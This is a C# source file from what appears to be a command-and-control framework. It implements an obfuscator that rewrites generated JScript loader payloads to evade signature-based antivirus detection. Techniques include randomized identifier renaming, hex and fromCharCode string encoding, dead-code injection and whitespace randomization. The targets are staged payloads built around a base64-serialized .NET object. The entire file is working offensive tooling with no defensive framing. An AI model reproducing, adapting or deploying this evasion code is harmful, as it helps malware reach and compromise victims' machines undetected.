using System.Text;
using System.Text.RegularExpressions;

namespace C2.Features.Loaders;

/// <summary>
/// JScript (WSH) obfuscator — transforms generated JScript payloads to evade
/// static/signature-based detection.
///
/// Techniques:
///   1. Variable/function name randomization
///   2. String literal encoding (hex escapes, fromCharCode, concatenation)
///   3. Dead code injection (decoy variables, branches, functions)
///   4. Whitespace/formatting randomization
/// </summary>
public static class JScriptObfuscator
{
    private static readonly Random Rng = new();

    public static string Obfuscate(string jscript)
    {
        var result = jscript;
        result = RenameIdentifiers(result);
        result = EncodeStringLiterals(result);
        result = InjectDeadCode(result);
        result = RandomizeWhitespace(result);
        return result;
    }

    // ── Identifier Renaming ─────────────────────────────────────────────

    private static string RenameIdentifiers(string js)
    {
        var identifiers = new[]
        {
            "Base64ToStream", "stage_1", "stage_2", "serialized_obj",
            "shell", "fmt_1", "fmt_2", "fmt",
            "enc", "length", "ba", "transform", "ms"
        };

        var map = new Dictionary<string, string>();
        foreach (var id in identifiers)
            map[id] = RandVar();

        foreach (var kv in map.OrderByDescending(kv => kv.Key.Length))
            js = Regex.Replace(js,
                @"(?<![a-zA-Z0-9_])" + Regex.Escape(kv.Key) + @"(?![a-zA-Z0-9_])",
                kv.Value);

        return js;
    }

    // ── String Literal Encoding ─────────────────────────────────────────

    private static string EncodeStringLiterals(string js)
    {
        return Regex.Replace(js, @"(['""])([^'""]*?)\1", m =>
        {
            var q = m.Groups[1].Value;
            var s = m.Groups[2].Value;

            if (s.Length == 0 || s.Length > 100 || s.Contains("AAEAAAD"))
                return m.Value;

            return Rng.Next(3) switch
            {
                0 => HexEscape(s, q),
                1 => FromCharCode(s),
                _ => SplitConcat(s, q)
            };
        });
    }

    private static string HexEscape(string s, string q)
    {
        var sb = new StringBuilder(s.Length * 4 + 2);
        sb.Append(q);
        foreach (var c in s)
            sb.Append($"\\x{(int)c:x2}");
        sb.Append(q);
        return sb.ToString();
    }

    private static string FromCharCode(string s)
    {
        var codes = string.Join(",", s.Select(c => (int)c));
        return $"String.fromCharCode({codes})";
    }

    private static string SplitConcat(string s, string q)
    {
        if (s.Length <= 3) return $"{q}{s}{q}";
        var parts = new List<string>();
        var i = 0;
        while (i < s.Length)
        {
            var n = Math.Min(Rng.Next(2, 5), s.Length - i);
            parts.Add($"{q}{s.Substring(i, n)}{q}");
            i += n;
        }
        return string.Join("+", parts);
    }

    // ── Dead Code Injection ─────────────────────────────────────────────

    private static string InjectDeadCode(string js)
    {
        var lines = js.Split('\n').ToList();
        var result = new List<string> { DecoyFunc(), "" };

        for (var i = 0; i < lines.Count; i++)
        {
            if (Rng.Next(6) == 0 && lines[i].Trim().Length > 0 && !lines[i].TrimStart().StartsWith("//"))
                result.Add(DeadStmt());
            result.Add(lines[i]);
        }

        result.Add("");
        result.Add(DecoyFunc());
        return string.Join("\n", result);
    }

    private static string DecoyFunc()
    {
        var n = RandVar(); var p = RandVar(); var l = RandVar();
        return Rng.Next(4) switch
        {
            0 => $"function {n}({p}) {{ var {l} = {p} ^ {Rng.Next(1, 9999)}; return {l} + {Rng.Next(1, 100)}; }}",
            1 => $"function {n}({p}) {{ var {l} = []; for (var i = 0; i < {p}; i++) {l}.push(i * {Rng.Next(2, 50)}); return {l}; }}",
            2 => $"function {n}({p}) {{ if ({p} > {Rng.Next(10, 500)}) return {p} - {Rng.Next(1, 99)}; return {p} + {Rng.Next(1, 99)}; }}",
            _ => $"function {n}({p}) {{ return ({p} % {Rng.Next(2, 17)}) == 0 ? {p} : {p} + {Rng.Next(1, 50)}; }}"
        };
    }

    private static string DeadStmt()
    {
        var v = RandVar();
        return Rng.Next(5) switch
        {
            0 => $"var {v} = {Rng.Next(1000, 99999)};",
            1 => $"var {v} = ({Rng.Next(100)} > {Rng.Next(100)}) ? {Rng.Next(999)} : {Rng.Next(999)};",
            2 => $"var {v} = String.fromCharCode({Rng.Next(65, 91)}, {Rng.Next(65, 91)}, {Rng.Next(65, 91)});",
            3 => $"if (false) {{ var {v} = {Rng.Next(9999)}; }}",
            _ => $"var {v} = parseInt(\"{Rng.Next(100, 9999)}\", 10);"
        };
    }

    // ── Whitespace Randomization ────────────────────────────────────────

    private static string RandomizeWhitespace(string js)
    {
        var lines = js.Split('\n');
        var sb = new StringBuilder();

        foreach (var line in lines)
        {
            var trimmed = line.TrimEnd();
            if (trimmed.Length == 0)
            {
                if (Rng.Next(3) != 0) sb.AppendLine();
                continue;
            }

            var stripped = trimmed.TrimStart();
            var origIndent = trimmed.Length - stripped.Length;
            if (origIndent > 0)
            {
                sb.Append(Rng.Next(2) == 0
                    ? new string('\t', Math.Max(1, origIndent / 4))
                    : new string(' ', origIndent + Rng.Next(-1, 2)));
            }
            sb.AppendLine(stripped);
        }

        return sb.ToString().TrimEnd('\r', '\n');
    }

    // ── Helpers ──────────────────────────────────────────────────────────

    private static string RandVar()
    {
        var sb = new StringBuilder();
        sb.Append("_$"[Rng.Next(2)]);
        for (var i = 0; i < Rng.Next(6, 13); i++)
            sb.Append(Rng.Next(3) switch
            {
                0 => (char)('a' + Rng.Next(26)),
                1 => (char)('A' + Rng.Next(26)),
                _ => '_'
            });
        sb.Append(Rng.Next(100, 999));
        return sb.ToString();
    }
}
